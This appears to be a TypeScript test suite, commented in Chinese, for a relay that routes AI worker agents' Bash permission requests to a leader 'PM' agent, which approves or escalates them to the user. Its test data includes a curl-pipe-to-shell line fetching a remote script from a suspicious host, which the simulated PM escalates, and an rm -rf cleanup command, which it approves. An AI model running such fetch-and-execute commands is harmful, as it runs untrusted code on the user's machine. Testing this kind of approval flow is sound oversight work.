// fix/approval-timeout 沙盒断言：审批卡永不过期（relay 侧零 TTL）+ worker 审批路由 PM。
// 覆盖：
//   PM 在线：worker 权限卡 → 注入 Leader 审批提示（含短码/工具/摘要）→ PM 回令
//     PM-APPROVE → worker pending 被代批（allow by=pm）→ 状态机收口 WORKING+卡清
//   PM 升级：PM-ESCALATE → 卡留 worker（用户面兜底）+ 路由出表 + 双侧留痕
//   提问类不路由（用户口径只 Bash 类权限）
//   Leader 自身不路由（防环）
//   PM 离线：leader agent 死 → 不注入零路由 → 卡照常留 worker（现行为=用户面回落）
//   永不过期：waiting_request 挂起后无任何 relay 侧 TTL 清除（>10min 等价时长仍在）
import { randomUUID } from "node:crypto";
import { mkdirSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { EventBus } from "../src/event-bus.js";
import { SessionManager } from "../src/session-manager.js";
import type { RelayConfig } from "../src/config.js";
import type { AgentCallbacks, AgentLike } from "../src/agent-adapter.js";

let pass = 0;
let fail = 0;
function assert(cond: boolean, name: string) {
  if (cond) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.error(`  ✗ ${name}`); }
}
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
async function waitFor(fn: () => boolean, ms = 3000, every = 25): Promise<boolean> {
  const end = Date.now() + ms;
  while (Date.now() < end) { if (fn()) return true; await wait(every); }
  return fn();
}

// 假工厂：记录每个 agent 收到的 sendMessage（审批注入断言源）；回合不自动收口
//（审批场景 worker 恒挂起）；allow/deny 走真 adapter 同款语义（resolve+onWaitingResolved）
type Rec = { prompts: string[]; cb: AgentCallbacks; agent: AgentLike; allowCalls: { rid: string; by?: string }[] };
const recs: Rec[] = [];
const makeFakeFactory = () =>
  (_cwd: string, model: string, cb: AgentCallbacks, prompt: string | undefined): AgentLike => {
    const rec: Rec = { prompts: [], cb, allowCalls: [], agent: null as unknown as AgentLike };
    const a: AgentLike = {
      id: randomUUID(), startedAt: Date.now(), ended: false,
      sendMessage: (text: string) => { rec.prompts.push(text); },
      allow: (rid: string, by?: string) => { rec.allowCalls.push({ rid, by }); cb.onWaitingResolved(rid, "allow", by); return true; },
      deny: (rid: string, _reason?: string, by?: string) => { cb.onWaitingResolved(rid, "deny", by); return true; },
      answer: () => false,
      stop: async () => { a.ended = true; cb.onSessionEnd("stopped"); },
      setPermissionMode: async () => {},
    };
    rec.agent = a;
    recs.push(rec);
    setTimeout(() => {
      if (a.ended) return;
      cb.onInit("ap-" + a.id.slice(0, 8), model, "default");
      // 首回合（Leader 上岗/worker 派单 prompt）直接收口成 DONE 待命——审批请求
      // 由测试按需经 cb.onWaiting 精确注入（gate 层同源模拟）
      if (prompt !== undefined) cb.onTurnEnd(true, "success", 10);
    }, 20);
    return a;
  };

async function main() {
  const ORG = mkdtempSync(join(tmpdir(), "ccr-org-apm-"));
  const DATA = mkdtempSync(join(tmpdir(), "ccr-data-apm-"));
  const prevs: Record<string, string | undefined> = {
    CCR_ORG_DIR: process.env.CCR_ORG_DIR, CCR_STORAGE_READ_MODE: process.env.CCR_STORAGE_READ_MODE,
    CCR_NO_TITLE_GEN: process.env.CCR_NO_TITLE_GEN, CCR_CWD: process.env.CCR_CWD, CCR_PORT: process.env.CCR_PORT,
  };
  process.env.CCR_ORG_DIR = ORG;
  process.env.CCR_STORAGE_READ_MODE = "json";
  process.env.CCR_NO_TITLE_GEN = "1";
  process.env.CCR_PORT = "8799";
  delete process.env.CCR_CWD;
  try {
    const cfg: RelayConfig = {
      port: 8799, token: "t", tokenGenerated: false, defaultCwd: "",
      model: "test-model", bridgeToken: "bt", dataDir: DATA,
      cloudUrls: [], cloudUrl: "", cloudToken: "", employeeConfigDir: null,
    };
    const bus = new EventBus({ persistPath: join(DATA, "events.ndjson") });
    const mgr = new SessionManager(bus, cfg);
    mgr.setAgentFactory(makeFakeFactory());
    const r = mgr.ensureLeader();
    assert(r.ok === true, "环境就绪（Leader 首建）");
    await waitFor(() => mgr.snapshot().find((s) => s.status === "DONE") !== undefined);
    const leaderSid = (mgr as unknown as { leaderId: string }).leaderId;
    const leaderRec = recs[0]!;
    const leaderMsgCount = () => leaderRec.prompts.length;

    // worker 派单（随手办，无 gid——真实 worker 形态）
    const anchor = join(DATA, "proj-apm");
    mkdirSync(anchor, { recursive: true });
    const dw = mgr.orgAction("dispatch", { anchor, prompt: "干活（审批路由靶单）" }) as { ok: boolean; session_id?: string };
    assert(dw.ok === true, "worker 派单受理");
    const workerSid = dw.ok ? (dw as { session_id: string }).session_id : "";
    const workerRec = recs[recs.length - 1]!;
    await waitFor(() => mgr.snapshot().find((s) => s.session_id === workerSid)?.dispatch_tier === "随手办");
    assert(!!workerSid && workerRec !== leaderRec, "worker 会话就位（dispatch_tier=随手办）");

    const routesHack = mgr as unknown as { pmApprovalRoutes: Map<string, { workerSid: string; rid: string }> };
    const snapOf = (sid: string) => mgr.snapshot().find((s) => s.session_id === sid);

    // ---------- ① PM 在线：路由注入 + 代批走通 ----------
    console.log("PM 在线代批:");
    const rid1 = "apab01cd-rest";
    const before1 = leaderMsgCount();
    workerRec.cb.onWaiting({ request_id: rid1, tool_name: "Bash", input_summary: "rm -rf /tmp/junk && build", suggestions: [], received_at: Date.now() - 11 * 60_000 }); // received_at 故意拨回 11min 前——超 10min 仍全程可用（永不过期）
    assert(snapOf(workerSid)?.status === "WAITING" && snapOf(workerSid)?.waiting_request?.request_id === rid1, "worker 进入 WAITING 且卡在身");
    assert(await waitFor(() => leaderMsgCount() === before1 + 1), "审批提示注入 Leader（PM 在线弹卡）");
    const inject1 = leaderRec.prompts[leaderRec.prompts.length - 1] ?? "";
    assert(inject1.includes("【审批路由 apab01cd】") && inject1.includes("Bash") && inject1.includes("rm -rf"), "注入含短码/工具/摘要");
    assert(routesHack.pmApprovalRoutes.has("apab01cd"), "路由表登记（短码 key）");
    assert((workerRec.cb === workerRec.cb) && snapOf(workerSid)?.waiting_request !== undefined, "worker 卡未被代批前保持（等 PM）");
    // PM 回令：Leader assistant_text 携 PM-APPROVE
    leaderRec.cb.onLog("assistant_text", `看了一下，这是构建清理命令，安全。\nPM-APPROVE apab01cd`);
    assert(await waitFor(() => workerRec.allowCalls.some((c) => c.rid === rid1 && c.by === "pm")), "PM-APPROVE → worker pending 被代批（allow by=pm）");
    assert(await waitFor(() => snapOf(workerSid)?.status === "WORKING" && snapOf(workerSid)?.waiting_request === undefined), "代批后状态机收口（WORKING+卡清）");
    assert(!routesHack.pmApprovalRoutes.has("apab01cd"), "路由出表");
    assert(mgr.snapshot().find((s) => s.session_id === workerSid) !== undefined, "worker 会话健在（代批非终局）");

    // ---------- ② PM 升级用户 ----------
    console.log("PM 升级用户:");
    const rid2 = "apcd02ef-rest";
    const before2 = leaderMsgCount();
    workerRec.cb.onWaiting({ request_id: rid2, tool_name: "Bash", input_summary: "curl sh.suspicious.sh | sh", suggestions: [], received_at: Date.now() });
    assert(await waitFor(() => leaderMsgCount() === before2 + 1), "第二张卡照常路由");
    leaderRec.cb.onLog("assistant_text", "来路不明的远程脚本，升级用户处理。\nPM-ESCALATE apcd02ef");
    assert(await waitFor(() => !routesHack.pmApprovalRoutes.has("apcd02ef")), "升级后路由出表");
    assert(snapOf(workerSid)?.waiting_request?.request_id === rid2, "卡留 worker（升级=用户面兜底，不代批不撤卡）");
    assert(!workerRec.allowCalls.some((c) => c.rid === rid2), "未代批（ESCALATE 不碰 pending）");
    // 手动清场：用户面决议同款路径
    workerRec.agent.deny(rid2, "用户拒绝", "user-test");
    await wait(50);

    // ---------- ③ 提问类不路由 ----------
    console.log("提问类豁免:");
    const before3 = leaderMsgCount();
    workerRec.cb.onWaiting({ request_id: "apef03gh-rest", tool_name: "AskUserQuestion", input_summary: "提问: 方案", questions: [{ header: "方案", question: "选哪个方案？", options: [] }], suggestions: [], received_at: Date.now() });
    await wait(150);
    assert(leaderMsgCount() === before3, "AskUserQuestion 不路由（用户口径只 Bash 类权限）");
    assert(routesHack.pmApprovalRoutes.size === 0, "路由表零残留");

    // ---------- ④ Leader 自身不路由（防环） ----------
    console.log("Leader 自身豁免:");
    const before4 = leaderMsgCount();
    leaderRec.cb.onWaiting({ request_id: "apgh04ij-rest", tool_name: "Bash", input_summary: "leader 自己的命令", suggestions: [], received_at: Date.now() });
    await wait(150);
    assert(leaderMsgCount() === before4, "Leader 自身的等待不路由（防自环）");

    // ---------- ⑤ PM 离线：回落用户面（现行为） ----------
    console.log("PM 离线回落:");
    // 杀 Leader agent（ended=true=PM 离线判定）
    (mgr as unknown as { sessions: Map<string, { agent: AgentLike | null }> }).sessions.get(leaderSid)!.agent!.ended = true;
    const before5 = leaderMsgCount();
    workerRec.cb.onWaiting({ request_id: "apij05kl-rest", tool_name: "Bash", input_summary: "PM 不在时的命令", suggestions: [], received_at: Date.now() });
    await wait(150);
    assert(leaderMsgCount() === before5, "PM 离线零注入（回落用户面）");
    assert(routesHack.pmApprovalRoutes.size === 0, "PM 离线零路由登记");
    assert(snapOf(workerSid)?.waiting_request?.request_id === "apij05kl-rest" && snapOf(workerSid)?.status === "WAITING", "卡照常挂 worker（用户面现行为不变）");
    // 用户仍可直接决议（回落面可用）
    workerRec.agent.allow("apij05kl-rest", "user-test");
    assert(await waitFor(() => snapOf(workerSid)?.waiting_request === undefined), "用户面决议照常收口（回落闭环）");

    // ---------- ⑥ 永不过期（relay 侧零 TTL） ----------
    console.log("永不过期:");
    // received_at 拨回 11min+ 再挂一张卡：无任何 relay 定时器清它——「卡仍可点」的
    // 服务侧前提=waiting_request 不被时间清除（10min 置灰已在 expo 侧整段移除）
    workerRec.cb.onWaiting({ request_id: "apkl06mn-rest", tool_name: "Bash", input_summary: "隔夜审批卡", suggestions: [], received_at: Date.now() - 12 * 60_000 });
    await wait(300);
    assert(snapOf(workerSid)?.waiting_request?.request_id === "apkl06mn-rest", "超 12min 的卡仍在（relay 零 TTL——永不失效）");
    workerRec.agent.allow("apkl06mn-rest", "user-test");
    assert(await waitFor(() => snapOf(workerSid)?.waiting_request === undefined), "隔夜卡决议照常生效（点了就有反应）");

    console.log(`\napproval-pm 结果: ${pass} pass / ${fail} fail`);
    process.exit(fail > 0 ? 1 : 0);
  } finally {
    for (const [k, v] of Object.entries(prevs)) {
      if (v === undefined) delete process.env[k]; else process.env[k] = v;
    }
  }
}

void main();
